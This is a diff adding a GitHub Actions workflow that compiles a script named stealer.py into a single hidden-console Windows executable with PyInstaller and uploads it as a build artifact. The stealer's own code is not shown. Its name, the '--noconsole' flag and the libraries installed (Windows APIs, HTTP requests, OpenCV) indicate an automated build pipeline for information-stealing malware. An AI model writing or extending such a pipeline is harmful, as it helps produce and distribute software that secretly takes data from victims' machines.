@@ -1,0 +1,22 @@
+name: Build EXE
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Install Python
+        uses: actions/setup-python@v2
+        with:
+          python-version: '3.9'
+      - name: Install dependencies
+        run: |
+          pip install pywin32 requests opencv-python pyinstaller
+      - name: Build with PyInstaller
+        run: |
+          pyinstaller --noconsole --onefile stealer.py
+      - name: Upload artifact
+        uses: actions/upload-artifact@v2
+        with:
+          name: stealer-exe
+          path: dist/stealer.exe
